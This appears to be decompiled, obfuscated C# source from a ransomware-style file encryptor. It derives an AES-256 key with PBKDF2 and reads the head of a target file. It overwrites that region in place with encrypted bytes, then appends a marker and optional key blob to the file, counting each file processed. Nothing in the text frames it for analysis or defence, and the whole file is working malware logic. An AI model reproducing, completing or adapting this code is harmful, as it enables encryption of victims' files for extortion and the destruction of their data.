using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace PMpBbYpvEb;

public static class ILCPTbEyPImvS
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] oTLflFQwfxprG(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = aglbCZbbXeXv(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static Rfc2898DeriveBytes aglbCZbbXeXv(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] hUdUxAsVxYJrsJYB(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (PhxOPeBqRsG.GUenUfjFQXZm == getString_0(107396873))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (PhxOPeBqRsG.iJiZVjbYIelgdjs)
			{
				try
				{
					File.AppendAllText(PhxOPeBqRsG.CJWDXdtMlfSYp, getString_0(107387384) + string_0 + getString_0(107409822) + ex.Message + getString_0(107395768));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
	}

	public static bool trQfhmTmPgoc(string eVaQLrRtqDcN, byte[] opGohBOiRlt, byte[] aiPzWzsMyTl = null)
	{
		try
		{
			byte[] array = null;
			if (PhxOPeBqRsG.GUenUfjFQXZm == getString_0(107396873))
			{
				array = (PhxOPeBqRsG.ldSVapxVzrqD ? Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(PhxOPeBqRsG.hvGepLoFGYytPmQoB) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409751)) + Convert.ToString(PhxOPeBqRsG.BDeugxVDNkK) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409751))) : (PhxOPeBqRsG.WcDXYQEnYXB ? Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409796)) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409805)) + Convert.ToString(PhxOPeBqRsG.BDeugxVDNkK) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409805))) : Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(PhxOPeBqRsG.hvGepLoFGYytPmQoB) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409805)) + Convert.ToString(PhxOPeBqRsG.BDeugxVDNkK) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409805)))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(eVaQLrRtqDcN, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(opGohBOiRlt, 0, opGohBOiRlt.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(eVaQLrRtqDcN, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!PhxOPeBqRsG.ldSVapxVzrqD)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(aiPzWzsMyTl, 0, aiPzWzsMyTl.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (PhxOPeBqRsG.ldSVapxVzrqD ? Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(PhxOPeBqRsG.hvGepLoFGYytPmQoB) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409751)) + Convert.ToString(PhxOPeBqRsG.BDeugxVDNkK) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409751))) : (PhxOPeBqRsG.WcDXYQEnYXB ? Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409796)) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409805)) + Convert.ToString(PhxOPeBqRsG.BDeugxVDNkK) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409805))) : Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(PhxOPeBqRsG.hvGepLoFGYytPmQoB) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409805)) + Convert.ToString(PhxOPeBqRsG.BDeugxVDNkK) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409805)))));
				FileStream fileStream2 = new FileStream(eVaQLrRtqDcN, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(opGohBOiRlt, 0, opGohBOiRlt.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream = new FileStream(eVaQLrRtqDcN, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!PhxOPeBqRsG.ldSVapxVzrqD)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(aiPzWzsMyTl, 0, aiPzWzsMyTl.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			PhxOPeBqRsG.AOxElPxfgdJ++;
		}
		catch (Exception ex)
		{
			if (PhxOPeBqRsG.iJiZVjbYIelgdjs)
			{
				try
				{
					File.AppendAllText(PhxOPeBqRsG.CJWDXdtMlfSYp, getString_0(107387384) + eVaQLrRtqDcN + getString_0(107409774) + ex.Message + getString_0(107395768));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array = null;
				array = (PhxOPeBqRsG.ldSVapxVzrqD ? Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(PhxOPeBqRsG.hvGepLoFGYytPmQoB) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409751)) + Convert.ToString(PhxOPeBqRsG.BDeugxVDNkK) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409751))) : (PhxOPeBqRsG.WcDXYQEnYXB ? Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409796)) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409805)) + Convert.ToString(PhxOPeBqRsG.BDeugxVDNkK) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409805))) : Encoding.ASCII.GetBytes(PhxOPeBqRsG.jPRGqhYdKzNWs(PhxOPeBqRsG.hvGepLoFGYytPmQoB) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409805)) + Convert.ToString(PhxOPeBqRsG.BDeugxVDNkK) + PhxOPeBqRsG.jPRGqhYdKzNWs(getString_0(107409805)))));
				FileStream fileStream2 = new FileStream(eVaQLrRtqDcN, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(opGohBOiRlt, 0, opGohBOiRlt.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using (FileStream fileStream = new FileStream(eVaQLrRtqDcN, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!PhxOPeBqRsG.ldSVapxVzrqD)
					{
						fileStream.Write(array, 0, array.Length);
					}
					else
					{
						fileStream.Write(aiPzWzsMyTl, 0, aiPzWzsMyTl.Length);
						fileStream.Write(array, 0, array.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static ILCPTbEyPImvS()
	{
		Strings.CreateGetStringDelegate(typeof(ILCPTbEyPImvS));
	}
}
